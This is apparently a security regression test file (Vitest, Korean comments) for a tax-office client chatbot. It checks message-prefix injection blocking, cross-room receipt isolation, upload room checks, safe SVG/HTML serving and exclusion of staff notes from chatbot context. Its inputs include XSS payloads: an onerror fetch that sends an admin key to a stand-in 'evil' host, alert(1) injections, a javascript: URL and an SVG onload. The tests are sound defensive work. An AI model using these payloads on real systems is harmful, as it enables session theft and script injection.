/**
 * 보안 점검 PR-1 (2026-11-19 사장님 "에이전시로 전방위 점검" → 긴급 항목)
 *
 *  C1  거래처가 메시지 글자로 [IMG]·[FILE]·[DOC:n]·[ALERT] 를 직접 보내 관리자 화면에서 스크립트 실행 → 서버가 거부
 *      [REPLY] 는 화면이 붙이므로 허용하되 정해진 칸만, 답장 번호는 영문·숫자만
 *  C2  상담방에 남의 영수증 번호([DOC:n])가 있어도 이 방 것이 아니면 내용을 붙이지 않음
 *  H7  대용량 업로드 완료 시 내가 들어가 있지 않은 방에는 파일 메시지를 못 남김
 *  H2  /api/image 는 일반 사진만 화면에 띄우고, svg·html 등은 다운로드 + 스크립트 금지
 *  M7  업체 "특이사항"(직원 메모)은 거래처 챗봇 문맥에 넣지 않음
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { createTestDb } from '../../packages/db/src/test-db';
// @ts-expect-error — JS module
import { onRequestGet as roomsGet, onRequestPost as roomsPost, sanitizeUserMessage } from './my-rooms.js';
// @ts-expect-error — JS module
import { onRequestPost as multipartPost } from './upload-multipart.js';
// @ts-expect-error — JS module
import { onRequestGet as imageGet } from './image.js';
// @ts-expect-error — JS module
import { onRequestPost as uploadFilePost } from './upload-file.js';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
/* chat.js 는 모듈 전체를 불러오면 무거워서, 문맥 만드는 부분만 잘라 실행 (chat-client-businesses.test.ts 와 같은 방식) */
const chatSrc = readFileSync(join(__dirname, 'chat.js'), 'utf8');
const { buildClientContext } = new Function(
  chatSrc.slice(chatSrc.indexOf('const _BIZ_FORM'), chatSrc.indexOf('async function getClientFilings')) + '\n; return { buildClientContext };')() as
  { buildClientContext: (b: Record<string, unknown>[], name: string | null) => string };

const ORIGIN = 'https://sewmu-chatbot.pages.dev';
let d1: ReturnType<typeof createTestDb>['d1'];
let env: Record<string, unknown>;

function req(method: string, path: string, tok: string | null, body?: unknown) {
  const h: Record<string, string> = { origin: ORIGIN };
  if (tok) h.cookie = 'session=' + tok;
  return { env, request: { url: ORIGIN + path, method, headers: { get: (k: string) => h[k.toLowerCase()] ?? null }, json: async () => body } };
}
async function send(tok: string, room: string, body: Record<string, unknown>) {
  const r = await roomsPost(req('POST', '/api/my-rooms?action=send', tok, { room_id: room, ...body }));
  return { status: r.status, body: await r.json() as any };
}

beforeEach(async () => {
  d1 = createTestDb().d1;
  env = { DB: d1 };
  for (const [id, name] of [[1, '갑'], [2, '을']] as const) {
    await d1.prepare(`INSERT INTO users (id, name, real_name, approval_status) VALUES (?, ?, ?, 'approved_client')`).bind(id, name, name).run();
    await d1.prepare(`INSERT INTO sessions (token, user_id, expires_at) VALUES (?, ?, '2099-01-01 00:00:00')`).bind('tok' + id, id).run();
  }
  await d1.prepare(`INSERT INTO chat_rooms (id, name, status) VALUES ('R1', '갑 상담방', 'active'), ('R2', '을 상담방', 'active')`).run();
  await d1.prepare(`INSERT INTO room_members (room_id, user_id, role) VALUES ('R1', 1, 'member'), ('R2', 2, 'member')`).run();
  /* 영수증: 갑이 R1 에, 을이 R2 에 */
  await d1.prepare(`INSERT INTO documents (id, user_id, room_id, doc_type, image_key, vendor, amount) VALUES
    (11, 1, 'R1', 'receipt', 'documents/u1/a.jpg', '갑문구', 1000),
    (22, 2, 'R2', 'receipt', 'documents/u2/b.jpg', '을식당비밀', 99000)`).run();
});

describe('C1 — 메시지 앞머리 위조 차단', () => {
  it('[IMG] 에 따옴표를 넣어 스크립트를 심는 메시지는 400', async () => {
    const r = await send('tok1', 'R1', { content: '[IMG]x"onerror="fetch(\'//evil/\'+sessionStorage.admin_key)' });
    expect(r.status).toBe(400);
    const c: any = await d1.prepare(`SELECT COUNT(*) n FROM conversations`).first();
    expect(c.n).toBe(0);
  });
  it('[DOC:n] · [FILE]{} · [ALERT]{} 를 글자로 보내면 400', async () => {
    for (const content of ['[DOC:22]', '[FILE]{"url":"javascript:alert(1)","name":"a"}', '[ALERT]{"t":"x"}']) {
      expect((await send('tok1', 'R1', { content })).status).toBe(400);
    }
  });
  it('챗봇 Q&A "상담방에 공유" 는 그대로 되고, 정해진 칸(q·a·t)만 다시 만들어 저장', async () => {
    const r = await send('tok1', 'R1', { content: '[CHATBOT_SHARE]' + JSON.stringify({ q: '부가세 언제?', a: '1월 25일입니다', t: 1700000000000, evil: '<img>' }) });
    expect(r.status).toBe(200);
    const row: any = await d1.prepare(`SELECT content FROM conversations`).first();
    expect(row.content).toBe('[CHATBOT_SHARE]{"q":"부가세 언제?","a":"1월 25일입니다","t":1700000000000}');
    expect((await send('tok1', 'R1', { content: '[CHATBOT_SHARE]' + JSON.stringify({ q: 'q'.repeat(1000), a: 'a'.repeat(3000), t: 1 }) })).status).toBe(200);
    expect((await send('tok1', 'R1', { content: '[CHATBOT_SHARE]["x"]' })).status).toBe(400);
    expect((await send('tok1', 'R1', { content: '[REPLY]{"t":"a","s":"b","i":"1"}\n[CHATBOT_SHARE]{"q":"a","a":"b"}' })).status).toBe(400);
  });
  it('사진 주소 뒤에 값을 붙여 따옴표·괄호를 넣는 것, 파일명에 따옴표 넣는 것은 400 (2바퀴 검토에서 찾은 길)', async () => {
    expect((await send('tok1', 'R1', { image_url: "/api/image?k=a&x=');alert(document.domain);//" })).status).toBe(400);
    expect((await send('tok1', 'R1', { file_url: '/api/file?k=u1%2Ffiles%2Fa.pdf', file_name: 'a" onmouseover="alert(1).pdf' })).status).toBe(400);
  });
  it('답장 안에 숨겨도 400, 답장 번호에 스크립트 넣어도 400', async () => {
    expect((await send('tok1', 'R1', { content: '[REPLY]{"t":"a","s":"b","i":"1"}\n[IMG]x"onerror="alert(1)' })).status).toBe(400);
    expect((await send('tok1', 'R1', { content: `[REPLY]{"t":"a","s":"b","i":"1');alert(1);//"}\n안녕` })).status).toBe(400);
  });
  it('정상 메시지·정상 답장·정상 사진은 그대로 저장 (답장은 정해진 칸만 남김)', async () => {
    expect((await send('tok1', 'R1', { content: '안녕하세요 [IMG] 라는 글자는 중간이면 괜찮아요' })).status).toBe(200);
    expect((await send('tok1', 'R1', { content: '[REPLY]{"t":"부가세 언제?","s":"세무사","i":123,"evil":"<x>"}\n네 확인했습니다' })).status).toBe(200);
    expect((await send('tok1', 'R1', { image_url: '/api/image?k=u1%2Ffiles%2Fa.jpg' })).status).toBe(200);
    const { results }: any = await d1.prepare(`SELECT content FROM conversations ORDER BY id`).all();
    expect(results.map((x: any) => x.content)).toEqual([
      '안녕하세요 [IMG] 라는 글자는 중간이면 괜찮아요',
      '[REPLY]{"t":"부가세 언제?","s":"세무사","i":"123"}\n네 확인했습니다',
      '[IMG]/api/image?k=u1%2Ffiles%2Fa.jpg',
    ]);
  });
  it('sanitizeUserMessage — 앞머리 규칙', () => {
    expect(sanitizeUserMessage('그냥 글')).toEqual({ content: '그냥 글' });
    expect(sanitizeUserMessage('[IMG]/api/image?k=a').error).toBeTruthy();
    expect(sanitizeUserMessage('[REPLY]{bad json}\nx').error).toBeTruthy();
    expect(sanitizeUserMessage('[REPLY]["array"]\nx').error).toBeTruthy();
  });
});

describe('C2 — 남의 영수증 내용 안 붙임', () => {
  it('방 기록에 다른 거래처 영수증 번호가 있어도 내용은 안 나오고, 이 방 영수증은 그대로', async () => {
    /* 예전 데이터나 다른 경로로 들어간 [DOC:22] 를 가정 (이제 글자로는 못 보냄) */
    await d1.prepare(`INSERT INTO conversations (session_id, user_id, role, content, room_id, created_at) VALUES
      ('room_R1', 1, 'user', '[DOC:22]', 'R1', '2026-11-19 10:00:00'),
      ('room_R1', 1, 'user', '[DOC:11]', 'R1', '2026-11-19 10:01:00')`).run();
    const r = await roomsGet(req('GET', '/api/my-rooms?room_id=R1', 'tok1'));
    const b = await r.json() as any;
    const msgs = b.messages || [];
    const other = msgs.find((m: any) => m.content === '[DOC:22]');
    const mine = msgs.find((m: any) => m.content === '[DOC:11]');
    expect(other && other.document).toBeUndefined();
    expect(JSON.stringify(b)).not.toContain('을식당비밀');
    expect(mine.document).toMatchObject({ id: 11, vendor: '갑문구' });
  });
});

describe('H7 — 업로드 완료 메시지는 내 방에만', () => {
  const bucket = { resumeMultipartUpload: () => ({ complete: async () => ({}) }) };
  async function complete(tok: string, room: string) {
    env = { DB: d1, MEDIA_BUCKET: bucket };
    const r = await multipartPost(req('POST', '/api/upload-multipart?action=complete', tok, {
      key: 'u1/files/1_abc.pdf', uploadId: 'x', parts: [{ partNumber: 1, etag: 'e' }], name: '자료.pdf', size: 10, room_id: room,
    }));
    return { status: r.status, body: await r.json() as any };
  }
  it('남의 방(R2)에는 403, 메시지 안 생김 / 내 방(R1)은 정상', async () => {
    expect((await complete('tok1', 'R2')).status).toBe(403);
    let c: any = await d1.prepare(`SELECT COUNT(*) n FROM conversations WHERE room_id = 'R2'`).first();
    expect(c.n).toBe(0);
    const ok = await complete('tok1', 'R1');
    expect(ok.status).toBe(200);
    expect(ok.body.messageId).toBeTruthy();
  });
  it('나간 방에도 못 남김', async () => {
    await d1.prepare(`UPDATE room_members SET left_at = '2026-11-01' WHERE room_id = 'R1' AND user_id = 1`).run();
    expect((await complete('tok1', 'R1')).status).toBe(403);
  });
});

describe('H2 — 업로드 파일 보여주기', () => {
  function bucketWith(ct: string) {
    return { get: async () => ({
      body: 'data', httpEtag: '"e"',
      writeHttpMetadata: (h: Headers) => { if (ct) h.set('Content-Type', ct); },
    }) };
  }
  async function view(key: string, ct: string) {
    env = { DB: d1, MEDIA_BUCKET: bucketWith(ct) };
    const r = await imageGet(req('GET', '/api/image?k=' + encodeURIComponent(key), null));
    return r.headers as Headers;
  }
  it('svg·html 은 다운로드로만 + 스크립트 금지', async () => {
    for (const [k, ct] of [['u1/files/x.svg', 'image/svg+xml'], ['u1/files/x.txt', 'text/html'], ['u1/files/x.xml', 'text/xml']]) {
      const h = await view(k, ct);
      expect(h.get('Content-Disposition')).toBe('attachment');
      expect(h.get('Content-Type')).toBe('application/octet-stream');
      expect(h.get('Content-Security-Policy')).toContain('sandbox');
    }
  });
  it('일반 사진은 화면에 그대로, 형식 모르는 HEIC 는 확장자로 사진 처리', async () => {
    const j = await view('u1/files/a.jpg', 'image/jpeg');
    expect(j.get('Content-Disposition')).toBeNull();
    expect(j.get('Content-Type')).toBe('image/jpeg');
    const h = await view('u1/files/a.heic', 'application/octet-stream');
    expect(h.get('Content-Type')).toBe('image/heic');
    expect(h.get('Content-Disposition')).toBeNull();
  });
  it('svg 업로드 자체를 거부', async () => {
    const fd = new FormData();
    fd.append('file', new File(['<svg onload="alert(1)"/>'], 'a.svg', { type: 'image/svg+xml' }));
    env = { DB: d1, MEDIA_BUCKET: { put: async () => ({}) } };
    /* Node 의 Request 는 cookie 헤더를 지우므로 formData 만 진짜로 두고 헤더는 직접 */
    const h: Record<string, string> = { cookie: 'session=tok1', origin: ORIGIN };
    const request = { url: ORIGIN + '/api/upload-file', method: 'POST', headers: { get: (k: string) => h[k.toLowerCase()] ?? null }, formData: async () => fd };
    const r = await uploadFilePost({ env, request });
    expect(r.status).toBe(400);
  });
});

describe('M7 — 직원 메모는 거래처 챗봇에 안 들어감', () => {
  it('특이사항이 있어도 문맥에 없음', () => {
    const ctx = buildClientContext([{ company_name: '갑상사', tax_type: '일반', notes: '대표 체납 이력 — 내부용' }], '홍길동');
    expect(ctx).toContain('갑상사');
    expect(ctx).not.toContain('체납');
    expect(ctx).not.toContain('특이사항');
  });
});
